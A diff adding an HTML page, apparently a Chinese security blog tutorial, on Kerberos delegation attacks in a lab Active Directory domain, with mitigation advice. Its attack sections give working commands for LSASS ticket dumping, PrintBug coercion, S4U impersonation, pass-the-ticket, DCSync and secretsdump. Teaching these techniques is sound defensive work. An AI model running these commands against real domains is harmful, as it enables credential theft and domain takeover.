@@ -1,0 +1,534 @@
+<html>
+
+<head>
+  <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>域渗透中的 Kerberos 委派攻击 | 3ND</title>
+<link rel="shortcut icon" href="https://github.com/inspiringz/inspiringz.github.io/favicon.ico?v=1627821474317">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://github.com/inspiringz/inspiringz.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="域渗透中的 Kerberos 委派攻击 | 3ND - Atom Feed" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="域委派 是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动。委派主要分为 非约束委派(Unconstrained delegation) 和 约束委派(Constrained delegation)。
+0x01 非..." />
+    <meta name="keywords" content="AD,Kerberos,Delegation" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <!--<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>-->
+    <script src="/media/highlight.min.js"></script>
+</head>
+
+<body>
+  <div class="main">
+    <div class="main-content">
+      <div class="site-header">
+  <a href="https://github.com/inspiringz/inspiringz.github.io">
+  <img class="avatar" src="https://github.com/inspiringz/inspiringz.github.io/images/avatar.png?v=1627821474317" alt="">
+  </a>
+  <h1 class="site-title">
+    3ND
+  </h1>
+  <p class="site-description">
+    夏が終わった
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/inspiringz" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              域渗透中的 Kerberos 委派攻击
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-01-18
+              </span>
+              <span>
+                19 min read
+              </span>
+              <span class="page-view" key="20210118141019" title="域渗透中的 Kerberos 委派攻击">
+              </span>
+              
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/ad/" class="post-tag">
+                  # AD
+                </a>
+                
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/kerberos/" class="post-tag">
+                  # Kerberos
+                </a>
+                
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/delegation/" class="post-tag">
+                  # Delegation
+                </a>
+                
+            </div>
+            
+                <div class="post-content-wrapper">
+                  <div class="post-content">
+                    <p><strong>域委派</strong> 是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动。委派主要分为 <strong>非约束委派(Unconstrained delegation)</strong> 和 <strong>约束委派(Constrained delegation)</strong>。</p>
+<h2 id="0x01-非约束委派">0x01 非约束委派</h2>
+<h3 id="unconstrained-delegation">Unconstrained Delegation</h3>
+<p><strong>在托管 TGS-REQ 中引用的服务主体名称（SPN) 中指定的服务的服务器上启用 Kerberos 非约束委派时，DC 将用户的 TGT 副本放入服务票据中。当用户的服务票据（TGS 票据）提供给服务器来访问服务时，服务器将打开 TGS 票据，将用户的 TGT 放入本地安全认证子系统服务 LSASS，以供以后使用，此时应用服务器可以无限制地模拟用户身份。</strong></p>
+<figure data-type="image" tabindex="1"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-18-15-02-21.png" alt="" loading="lazy"></figure>
+<p><strong>1a.</strong> 用户密码转换为 NTLM 哈希，时间戳使用哈希进行加密，并作为身份验证票据&amp;票据授予票据（TGT）请求（AS-REQ）中的身份验证器发送给 KDC。</p>
+<p><strong>1b.</strong> 域控制器（KDC）检查用户信息（登录限制，组成员身份等）并创建票据授予票据（TGT）。</p>
+<p><strong>2.</strong> 票据授予票据 TGT 加密、签名，并交付给用户（AS-REP）。只有域中的 Kerberos 服务（KRBTGT）才能打开和读取 TGT 数据。</p>
+<p><strong>3.</strong> 用户向 DC 发送 TGT，请求票据授予服务（TGS）票据（TGS-REQ）。DC 打开 TGT 并验证 PAC 校验和，如果 DC 可以打开票及校验且 PAC 校验通过，TGT 有效，复制 TGT 中的数据以创建 TGS 票据。</p>
+<p><strong>4.</strong> TGS 票据通过目标服务账户的 NTLM Hash 加密后发送给用户(TGS-REP).</p>
+<p><strong>5.</strong> 用户连接到在适当端口上托管服务的服务器 &amp; 发送 TGS (AP-REQ)，服务通过自己的 NTLM Hash 打开票据。</p>
+<h3 id="credential-theft">Credential Theft</h3>
+<p>实验环境：</p>
+<ul>
+<li>
+<p>Domain：ins.z</p>
+</li>
+<li>
+<p>Domain Controller: Windows Server 2012 R2, netbios <code>2012dc</code>, 192.168.1.12</p>
+</li>
+<li>
+<p>Domain Computer: Windows Server 2008 R2, netbios <code>IIS-8</code>, 192.168.1.8</p>
+</li>
+</ul>
+<p>1. DC 为 IIS-8 主机用户设置非约束委派：</p>
+<p>Active Directory 用户和计算机 -&gt; Computers -&gt; IIS-8 -&gt; 属性 &amp; 委派:</p>
+<ul>
+<li>
+<p>委派是一个安全敏感的操作，它允许服务代表另一个用户运行。</p>
+</li>
+<li>
+<p>☑ 信任此计算机来委派任何服务（仅 Kerberos）(T)</p>
+</li>
+</ul>
+<p>2. IIS-8 开启 WinRM 服务：</p>
+<pre><code class="language-sh">winrm quickconfig -q / Enable-PSRemoting -Force
+winrm e winrm/config/listener
+</code></pre>
+<p>3. DC 以 <code>administrator</code> 的身份通过 WinRM 服务远程连接 IIS-8:</p>
+<pre><code class="language-sh">Enter-PSSession -ComputerName iis-8
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-18-18-52-56.png" alt="" loading="lazy"></figure>
+<p>4. 此时域管理员的 TGT 已经缓存在 IIS-8 LSASS，通过 mimikatz/Rubeus 可导出：</p>
+<pre><code class="language-sh"># mimikatz
+privilege::debug 
+sekurlsa::tickets /export
+# rubeus
+rubeus.exe triage
+rubeus.exe dump # [IO.File]::WriteAllBytes(&quot;ticket.kirbi&quot;, [Convert]::FromBase64String(&quot;aa...&quot;))
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-20-11-41-02.png" alt="" loading="lazy"></figure>
+<p>测试当前无权限访问 DC 的 cifs 服务：</p>
+<figure data-type="image" tabindex="4"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-20-11-43-27.png" alt="" loading="lazy"></figure>
+<pre><code class="language-sh">mimikatz.exe &quot;kerberos::ptt file.kirbi&quot; &quot;exit&quot;
+rubeus.exe ptt /ticket:file.kirbi
+</code></pre>
+<p>导入 DC administrator tgt 票据后可成功访问：</p>
+<figure data-type="image" tabindex="5"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-20-15-04-11.png" alt="" loading="lazy"></figure>
+<p>Procdump + mimikatz:</p>
+<pre><code class="language-sh">procdump64.exe -accepteula -ma lsass.exe
+mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::tickets /export&quot; &quot;exit&quot;
+</code></pre>
+<h3 id="dc-print-bug">&amp; DC Print Bug</h3>
+<p><code>PrintBug</code>: Windows 打印系统远程协议（<code>MS-RPRN</code>）中的一种旧的但是默认启用的方法 <code>RpcRemoteFindFirstPrinterChangeNotification（Ex）</code>强制任何运行了 <code>Spooler</code> 服务的计算机以通过<code>Kerberos</code> 或 <code>NTLM</code> 对攻击者选择的目标进行身份验证。任何经过身份验证的域用户都可以远程连接到 DC 的打印服务器（后台打印程序服务, Spooler Service）并请求更新新的打印作业，DC 将立即测试该连接，从而暴露 DC 计算机帐户的凭据（因为后台打印程序为 SYSTEM 拥有）。</p>
+<figure data-type="image" tabindex="6"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-20-16-26-11.png" alt="" loading="lazy"></figure>
+<p>攻击者向 DC(运行后台打印程序服务,Print Spooler Service) 发送 RpcRemoteFindFirstPrinterChangeNotification 请求，DC 收到后立即向攻击者所控制的一台 <strong>主机账户开启了非约束委派</strong> 的域内机器发起身份认证，攻击者可在非约束委派机器的 LSASS 进程中获取到 DC 主机账户的 TGT 票据。</p>
+<p><a href="https://github.com/leftp/SpoolSamplerNET">SpoolSamplerNET</a> 请求 DC Spooler Service：</p>
+<pre><code class="language-sh">SpoolSamplerNET.exe win10.ins.z 2012dc.ins.z
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-20-17-17-53.png" alt="" loading="lazy"></figure>
+<p>非约束委派机器上 Rubeus 成功捕获到 DC 机器用户 2012dc$ 的 tgt 票据：</p>
+<pre><code class="language-sh">.\Rubeus.exe monitor /interval:1 /filteruser:2012dc$
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-20-17-18-37.png" alt="" loading="lazy"></figure>
+<p>转换 Base64 TGT 为 kirbi 票据文件，并通过 Rubeus 导入：</p>
+<pre><code class="language-sh">[IO.File]::WriteAllBytes(&quot;ticket.kirbi&quot;, [Convert]::FromBase64String(&quot;aa...&quot;))
+.\Rubeus.exe ptt /ticket:ticket.kirbi
+</code></pre>
+<p>进而可以 mimikatz / <a href="https://github.com/notsoshant/DCSyncer">DCSyncer</a> 来 DCSync：</p>
+<pre><code>mimikatz &quot;lsadump::dcsync /domain:ins.z /all /csv&quot; &quot;exit&quot;
+DCSyncer-x64.exe
+</code></pre>
+<h3 id="mitigation">Mitigation</h3>
+<ol>
+<li>
+<p>不使用非约束委派，使用约束委派配置需要委派的服务器。</p>
+</li>
+<li>
+<p>将所有提升的管理员帐户配置为”帐户敏感，无法委派“。</p>
+</li>
+<li>
+<p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn466518(v=ws.11)?redirectedfrom=MSDN">Protected Users Group</a>, Windows Server 2012 R2 域功能级别开始提供的可用版本也缓解了此问题，因为此组中的帐户不允许委派。</p>
+</li>
+</ol>
+<blockquote>
+<p>当受保护的用户的组帐户升级到 Windows Server 2012 R2 域功能级别时，基于域控制器的保护会自动应用。通过 Windows Server 2012 R2 域进行身份验证的受保护用户组的成员不再可以使用以下方法进行身份验证：</p>
+<ul>
+<li>默认凭证委派(Default credential delegation, CredSSP), 即使启用了“允许委派默认凭据组策略”设置，也不会缓存纯文本凭据。</li>
+<li>Windows Digest, 即使启用 Windows Digest，也不会缓存纯文本凭据。</li>
+<li>NTLM, NT 单向函数的结果 NTOWF 未缓存。</li>
+<li>Kerberos 长期密钥, 来自 Kerberos 初始 TGT 请求的密钥通常会被缓存，因此身份验证请求不会中断。对于该组中的帐户，Kerberos 协议会在每个请求时验证身份验证。</li>
+<li>离线登陆，登录时未创建缓存的验证程序。</li>
+</ul>
+</blockquote>
+<h2 id="0x02-约束委派">0x02 约束委派</h2>
+<h3 id="constrained-delegation">Constrained Delegation</h3>
+<p>由于非约束委派的不安全性（配置了非约束委派的机器在 LSASS 中缓存了用户的 TGT 票据可模拟用户去访问域中任意服务），微软在 Windows Server 2003 中引入了约束委派，对 Kerberos 协议进行拓展，引入了 <code>S4U</code>(S4U2Self / S4U2proxy), 运行服务代表用户向 KDC 请求票据。</p>
+<ul>
+<li>
+<p><code>S4U2self</code>(Service for User to S4U2Self) 可以代表自身请求针对其自身的 Kerberos 服务票据(ST)；如果一个<strong>服务账户</strong>的 userAccountControl 标志为 <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>, 则其可以<strong>代表任何其他用户</strong>获取自身服务的 TGS/ST。</p>
+</li>
+<li>
+<p><code>S4U2proxy</code>(Service for User to Proxy) 可以以用户的名义请求其它服务的 ST，限制了 S4U2proxy 扩展的范围。服务帐户可以<strong>代表任何用户</strong>获取在 <code>msDS-AllowedToDelegateTo</code> 中设置的服务的 TGS/ST，首先需要从该用户到其本身的 TGS/ST，但它可以在请求另一个 TGS 之前使用 S4U2self 获得此 TGS/ST。</p>
+</li>
+</ul>
+<p>不同于允许委派所有服务的非约束委派，约束委派的目的是在模拟用户的同时，限制委派机器/帐户对特定服务的访问。</p>
+<figure data-type="image" tabindex="9"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-20-18-29-35.png" alt="" loading="lazy"></figure>
+<p><strong>S4U2self</strong>：</p>
+<p>(1) 用户向 service1 发送请求。用户已通过身份验证，但 service1 没有用户的授权数据。通常，这是由于身份验证是通过 Kerberos 以外的其他方式验证的。</p>
+<p>(2) 通过 S4U2self 扩展以用户的名义向 KDC 请求用于访问 service1 的 ST1。</p>
+<p>(3) KDC 返回给 service1 一个用于用户验证 service1 的 ST1，该 ST1 可能包含用户的授权数据。</p>
+<p>(4) service1 可以使用 ST 中的授权数据来满足用户的请求，然后响应用户。</p>
+<p>尽管 S4U2self 向 service1 提供有关用户的信息，但 S4U2self 不允许 service1 代表用户发出其他服务的请求，这时候就轮到 S4U2proxy 发挥作用了。</p>
+<p><strong>S4U2proxy</strong>:</p>
+<p>(5) 用户向 service1 发送请求，service1 需要以用户身份访问 service2 上的资源。</p>
+<p>(6) service1 以用户的名义向 KDC 请求用户访问 service 2的 ST2。</p>
+<p>(7) 如果请求中包含 PAC，则 KDC 通过检查 PAC 的签名数据来验证 PAC ，如果 PAC 有效或不存在，则 KDC 返回 ST2 给 service1，但存储在 ST2 的 cname 和 crealm 字段中的客户端身份是用户的身份，而不是 service1 的身份。</p>
+<p>(8) service1 使用 ST2 以用户的名义向 service2 发送请求，并判定用户已由 KDC 进行身份验证。</p>
+<p>(9) service2 响应步骤 8 的请求。</p>
+<p>(10) service1 响应用户对步骤 5 中的请求。</p>
+<h3 id="attack">Attack</h3>
+<p><strong>如果我们可以攻破配置约束委派的服务账户(获取密码/Hash)，我们就可以模拟域内任意用户(如 domain\administrator) 并代表其获得对已配置服务的访问权限（获取 TGS 票据）。</strong></p>
+<p>此外，我们不仅可以访问约束委派配置中用户可以模拟的服务，<strong>还可以访问使用与模拟帐户权限允许的任何服务。</strong>（因为未检查 SPN，只检查权限）。比如，如果我们能够访问 CIFS 服务，那么同样有权限访问 HOST 服务。注意如果我们有权限访问到 DC 的 LDAP 服务，则有足够的权限去执行 DCSync。</p>
+<blockquote>
+<p>如果 AD 中将用户标记为“帐户敏感且无法委派”，则无法模拟其身份。</p>
+</blockquote>
+<p>实验环境：</p>
+<ul>
+<li>
+<p>Domain: ins.z</p>
+</li>
+<li>
+<p>Domain Controller</p>
+<ul>
+<li>Windows Server 2012 R2, 2012dc.ins.z, 192.168.1.12</li>
+</ul>
+</li>
+<li>
+<p>Domain Computer</p>
+<ul>
+<li>Windows Server 2008 R2, iis-8.ins.z, 192.168.1.8</li>
+<li>Windows 10 Pro, win10.ins.z, 192.168.1.10</li>
+<li>Windows 7 Pro, win7.ins.z, 192.168.1.7</li>
+</ul>
+</li>
+</ul>
+<p>在 DC 上为 IIS-8 机器账号设置约束委派，仅信任此计算机来委派指定的服务，可由此账户提供委派凭据的服务为 <code>cifs\win7.ins.z</code>.</p>
+<p>当我们掌握了 <code>IIS-8$</code> 的 NTLM Hash 后，可通过 kekeo/Rubeus 进行认证服务器交换获取票据授予票据 TGT。</p>
+<pre><code class="language-sh">Rubeus.exe asktgt /user:IIS-8$ /rc4:bd3d734cdaec88d806c2f8458eb6c357 /outfile:tgt_iis-8.kirbi
+# [+] Ticket successfully imported!
+kekeo.exe &quot;tgt::ask /user:IIS-8$ /domain:ins.z /ntlm:bd3d734cdaec88d806c2f8458eb6c357&quot; &quot;exit&quot;
+# Ticket in file 'TGT_IIS-8$@INS.Z_krbtgt~ins.z@INS.Z.kirbi'
+</code></pre>
+<p>进而通过约束委派机器账户 IIS-8$ 的 TGT 来伪造 S4U 请求，以 ins\administrator 的用户身份请求访问 cifs/win7.ins.z:</p>
+<pre><code class="language-sh">kekeo.exe tgs::s4u /tgt:TGT_IIS-8$@INS.Z_krbtgt~ins.z@INS.Z.kirbi /user:administrator@ins.z /service:cifs/win7.ins.z
+# &gt; Ticket in file 'TGS_administrator@ins.z@INS.Z_IIS-8$@INS.Z.kirbi' -&gt; S4U2self
+# &gt; Ticket in file 'TGS_administrator@ins.z@INS.Z_cifs~win7.ins.z@INS.Z.kirbi' -&gt; S4U2proxy
+</code></pre>
+<p>最后通过 mimikatz/Rubeus 导入用于访问 cifs/win7.ins.z 的 TGS 即可：</p>
+<pre><code class="language-sh">mimikatz.exe kerberos::ptt TGS_administrator@ins.z@INS.Z_cifs~win7.ins.z@INS.Z.kirbi
+Rubeus.exe ptt /ticket:TGS_administrator@ins.z@INS.Z_cifs~win7.ins.z@INS.Z.kirbi
+</code></pre>
+<p>访问 cifs/win7.ins.z 进行验证：</p>
+<pre><code>C:\Users\002\Desktop&gt;dir \\win7.ins.z\c$
+ 驱动器 \\win7.ins.z\c$ 中的卷没有标签。
+ 卷的序列号是 54BC-FE1C
+
+ \\win7.ins.z\c$ 的目录
+
+2009/07/14  11:20    &lt;DIR&gt;          PerfLogs
+2011/04/12  22:57    &lt;DIR&gt;          Program Files
+2009/07/14  12:57    &lt;DIR&gt;          Program Files (x86)
+2021/01/21  15:16    &lt;DIR&gt;          Users
+2021/01/18  17:38    &lt;DIR&gt;          Windows
+               0 个文件              0 字节
+               5 个目录 52,403,658,752 可用字节
+</code></pre>
+<p>委派过程分析：</p>
+<figure data-type="image" tabindex="10"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-21-15-51-26.png" alt="" loading="lazy"></figure>
+<p>1. <code>AS 认证服务器交换</code> IIS-8$ 向 KDC 申请票据授予票据 TGT：</p>
+<figure data-type="image" tabindex="11"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-21-15-56-02.png" alt="" loading="lazy"></figure>
+<p>2. <code>S4U2self</code> 通过步骤 1 获取的票据授予票据 TGT 来发送 S4U2self 请求，以 <code>ins\administrator</code> 身份向 TGS 票据许可服务器申请访问自身的服务票据授予服务 TGS 票据。</p>
+<figure data-type="image" tabindex="12"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-21-17-23-05.png" alt="" loading="lazy"></figure>
+<p>3. <code>S4U2proxy</code> 附带上步骤 2 获取的 TGS 票据向 DC 发起 S4U2proxy 请求，以 <code>ins\administrator</code> 身份向 TGS 票据许可服务器申请访问 Win7 cifs 服务票据。</p>
+<figure data-type="image" tabindex="13"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-21-17-30-11.png" alt="" loading="lazy"></figure>
+<p>kekeo:</p>
+<pre><code class="language-sh">tgt::ask /user:IIS-8$ /domain:ins.z /ntlm:bd3d734cdaec88d806c2f8458eb6c357
+kerberos::ptt TGT_IIS-8$@INS.Z_krbtgt~ins.z@INS.Z.kirbi
+tgs::s4u /tgt:TGT_IIS-8$@INS.Z_krbtgt~ins.z@INS.Z.kirbi /user:administrator@ins.z /service:cifs/win7.ins.z
+kerberos::ptt TGS_administrator@ins.z@INS.Z_cifs~win7.ins.z@INS.Z.kirbi
+</code></pre>
+<p>rubeus:</p>
+<pre><code class="language-sh"># rubeus
+# Obtain a TGT for the Constained allowed user
+Rubeus.exe asktgt /user:iis-8$ /rc4:bd3d734cdaec88d806c2f8458eb6c357 /outfile:TGT_iis-8.kirbi
+# Obtain a TGS of the Administrator user to self
+Rubeus.exe s4u /ticket:TGT_iis-8.kirbi /impersonateuser:Administrator /outfile:TGS_administrator.kirbi
+# Obtain service TGS impersonating Administrator (CIFS)
+Rubeus.exe s4u /ticket:TGT_iis-8.kirbi /tgs:TGS_administrator_Administrator@INS.Z_to_iis-8$@INS.Z.kirbi /msdsspn:&quot;CIFS/win7.ins.z&quot; /outfile:TGS_administrator_CIFS.kirbi
+# Impersonate Administrator on different service (HOST)
+Rubeus.exe s4u /ticket:TGT_iis-8.kirbi /tgs:TGS_administrator_Administrator@INS.Z_to_iis-8$@INS.Z.kirbi /msdsspn:&quot;CIFS/win7.ins.z&quot; /altservice:HOST /outfile:TGS_administrator_HOST.kirbi
+# Load ticket in memory
+Rubeus.exe ptt /ticket:TGS_administrator_HOST_HOST-win7.ins.z.kirbi
+Rubeus.exe ptt /ticket:TGS_administrator_HOST_HTTP-win7.ins.z.kirbi
+</code></pre>
+<p>导入与约束委派允许的服务所在服务器相对应的 HOST 服务票据 + HTTP 服务票据，即可伪装为域管用户 administrator 通过 WinRM 管理远程主机。</p>
+<figure data-type="image" tabindex="14"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-22-11-41-58.png" alt="" loading="lazy"></figure>
+<pre><code class="language-sh">winrs -r:win7.ins.z &quot;ipconfig&quot;(/cmd)
+</code></pre>
+<figure data-type="image" tabindex="15"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-22-11-25-39.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="16"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-22-11-40-49.png" alt="" loading="lazy"></figure>
+<blockquote>
+<p>WinRM 代表 Windows 远程管理，是一种允许管理员远程执行系统管理任务的服务。通过 HTTP（5985）或 HTTPS SOAP（5986）执行通信，默认情况下支持 Kerberos 和 NTLM 身份验证以及基本身份验证。使用此服务需要管理员级别凭据。</p>
+</blockquote>
+<p>约束委派账户伪造 adnimistrator 账户访问 dc krbtgt 服务，生成 ccache 文件注入内存，效果相当于“黄金票据”：</p>
+<pre><code class="language-sh"># impacket getST https://github.com/ropnop/impacket_static_binaries
+getST.exe -spn cifs/win7.ins.z -impersonate Administrator -hashes :bd3d734cdaec88d806c2f8458eb6c357 -dc-ip 192.168.1.12 ins.z/iis-8$
+# mimikatz ptc pass the cache
+mimikatz.exe &quot;kerberos::ptc Administrator.ccache&quot; &quot;exit&quot;
+# impacket wmiexec
+set KRB5CCNAME=Administrator.ccache
+wmiexec.exe -no-pass -k administrator@2012dc.ins.z -dc-ip 192.168.1.12
+# impacket secretdump
+set KRB5CCNAME=Administrator.ccache
+secretsdump.exe -no-pass -k 2012dc.ins.z
+</code></pre>
+<h3 id="mitigation-2">Mitigation</h3>
+<ol>
+<li>尽可能禁用 Kerberos 委派。</li>
+<li>限制 Domain Admin 登录范围。</li>
+<li>为特权帐户设置“帐户敏感，无法委托” / 加入 Protected Group。</li>
+<li>提高用户密码复杂度，抵抗 Kerberoasting 攻击。</li>
+</ol>
+<h2 id="0x03-基于资源的约束委派">0x03 基于资源的约束委派</h2>
+<h3 id="rbcd">RBCD</h3>
+<p>微软在 Windows Server 2012 中新加入了基于 kerberos 资源的约束委派(rbcd)，与传统的约束委派相比，它不再需要域管理员对其进行配置，可以直接在机器账户上配置<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性来设置基于资源的约束委派。此属性的作用是控制哪些用户可以模拟成域内任意用户，然后向该计算机进行身份验证。</p>
+<p>基于资源的约束委派与约束委派相似，不同之处在于约束委派赋予 <strong>服务(机器)账号/对象</strong> 权限去 <strong>模拟任意用户访问特定资源服务</strong>，而基于资源的约束委派<strong>对资源对象设置谁能代表(任意)用户来访问它</strong>，资源对象本身可以为自己配置资源委派信任关系，决定信任对象。</p>
+<figure data-type="image" tabindex="17"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-22-18-19-41.png" alt="" loading="lazy"></figure>
+<p>在这种情况下，受约束的资源对象将具有一个名为 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 的属性，其值为可以模拟其他任何用户的服务账户名。</p>
+<p>此外基于资源的约束委派与其他委派形式有个重要区别是，任何具有<strong>计算机帐户写权限（GenericAll/GenericWrite/WriteDacl/WriteProperty/etc）的任何用户都可以设置</strong> <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性，在其他形式的委派中，此类操作需要域管理员特权才能完成。</p>
+<p>事实上，在约束委派 <code>S4U2Self</code> 过程中，服务账户（有 SPN）可以在 <code>userAccountControl</code> 中无 <code>TrustedToAuthForDelegation</code> 标识的情况下，代表任意其他用户获取自身服务的 TGS 票据，但只有在包含 <code>TrustedToAuthForDelegation</code> 位时，返回的 TGS 票据才是可转发的 <code>Forwardable</code>。</p>
+<p>如果在 <code>S4U2Self</code> 中获取的 TGS 票据不包含 <code>Forwardable</code> 属性，在约束委派的 <code>S4U2proxy</code> 中将无法使用。<strong>但是，如果将其用于基于资源的约束委派，它将起作用（显然这不是漏洞，而是功能）。</strong></p>
+<h3 id="attack-2">Attack</h3>
+<blockquote>
+<p>如果我们具有计算机帐户的等效写权限，则可以在该计算机上获得特权访问权限。</p>
+</blockquote>
+<p>假设攻击者已经在受害计算机上拥有等同于计算机账户的写入权限：</p>
+<p>1. 攻击者攻破 <strong>具有 SPN 的账户</strong> 或创建一个 SPN 的帐户（Sercive A）。<strong>没有任何其他特殊特权的任意管理员用户都可以最多创建 10 个计算机对象(<code>MachineAccountQuota</code>)，并为其设置服务主体名称 SPN。</strong></p>
+<p>2. 攻击者配置从 Service A 到受害主机 Service B 的基于资源的约束委派。</p>
+<p>3. 攻击者使用 Rubeus 执行完整的 <code>S4U</code> 攻击，从 Service A 到 Service B，在对 Service B 没有特殊访问权限的情况下。</p>
+<ul>
+<li>
+<p><code>S4U2Self</code>(SPN compromised/created account): 模仿 administrator 请求一张 TGS 服务票据 (Not <code>Forwardable</code>).</p>
+</li>
+<li>
+<p><code>S4U2Proxy</code>：使用 <code>S4U2Self</code> 获取的 TGS 票据，请求从 administrator 到受害主机 Service B 的 TGS 票据。</p>
+</li>
+</ul>
+<p>4. 攻击者可通过 PTT 模拟 administrator 获取受害主机 Service B 的访问权限。</p>
+<p><strong>*</strong> <code>MachineAccountQuota</code> MAQ 是一个域级别的属性，默认情况下可以允许非特权用户(普通域用户)将主机连接到 AD 域，能连接的主机数最多不超过 10 台。该值表示允许域用户在域中创建的计算机帐户数，默认为 10，计算机账户默认注册 RestrictedKrbHost/domain 和 HOST/domain SPN。</p>
+<pre><code class="language-sh">Get-DomainObject -Identity &quot;dc=ins,dc=z&quot; -Domain ins.z | select MachineAccountQuota
+</code></pre>
+<p>在 <a href="https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/">这是一篇“不一样”的真实渗透测试案例分析文章</a> 中，作者根据 Discuz 数据库中提取的用户名和密码通过 Kerberute 进行用户名撞库及密码喷洒，成功获取到一个普通域用户账号来添加机器账户 <code>evilpc$</code> (含 SPN)，再通过 <code>webdev</code> 服务器 XXE 进行 NTTLMRelay 到域控 LDAP 配置基于资源的约束委派，允许 <code>evilpc$</code> 代表任意账户访问，最后通过 S4U 协议向申请高权限(administrator)票据，进而 PTT 完成对 <code>webdav</code> 服务器的控制。</p>
+<p><strong>- Reference -</strong></p>
+<p>[1] <a href="https://xz.aliyun.com/t/7217">域渗透——Kerberos委派攻击</a></p>
+<p>[2] <a href="https://adsecurity.org/?p=1667">Active Directory Security Risk #101: Kerberos Unconstrained Delegation</a></p>
+<p>[3] <a href="https://adsecurity.org/?page_id=183">SPNs - Active Directory Service Principal Names (SPNs) Descriptions</a></p>
+<p>[4] <a href="http://t3ngyu.leanote.com/post/LM-WinRM-WinRS">横向渗透之 [WinRM] &amp; [WinRS]</a></p>
+<p>[5] <a href="https://book.hacktricks.xyz/windows/active-directory-methodology/constrained-delegation">Constrained Delegation - HackTricks</a></p>
+<p>[6] <a href="https://xz.aliyun.com/t/7454">域渗透——基于资源的约束委派利用</a></p>
+<p>[7] <a href="https://github.com/Y4er/Y4er.com/blob/master/content/post/Kerberos-Resource-based-Constrained-Delegation.md">Kerberos 协议之基于资源的约束委派</a></p>
+<p>[8] <a href="https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/">这是一篇“不一样”的真实渗透测试案例分析文章</a></p>
+
+                  </div>
+                  <div class="toc-container">
+                    <div style="position: sticky;
+                    top: 20px;">
+                    <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#0x01-%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE">0x01 非约束委派</a>
+<ul>
+<li><a href="#unconstrained-delegation">Unconstrained Delegation</a></li>
+<li><a href="#credential-theft">Credential Theft</a></li>
+<li><a href="#dc-print-bug">&amp; DC Print Bug</a></li>
+<li><a href="#mitigation">Mitigation</a></li>
+</ul>
+</li>
+<li><a href="#0x02-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE">0x02 约束委派</a>
+<ul>
+<li><a href="#constrained-delegation">Constrained Delegation</a></li>
+<li><a href="#attack">Attack</a></li>
+<li><a href="#mitigation-2">Mitigation</a></li>
+</ul>
+</li>
+<li><a href="#0x03-%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE">0x03 基于资源的约束委派</a>
+<ul>
+<li><a href="#rbcd">RBCD</a></li>
+<li><a href="#attack-2">Attack</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+                  </div>
+                  </div>
+                </div>
+          </article>
+        </div>
+
+        
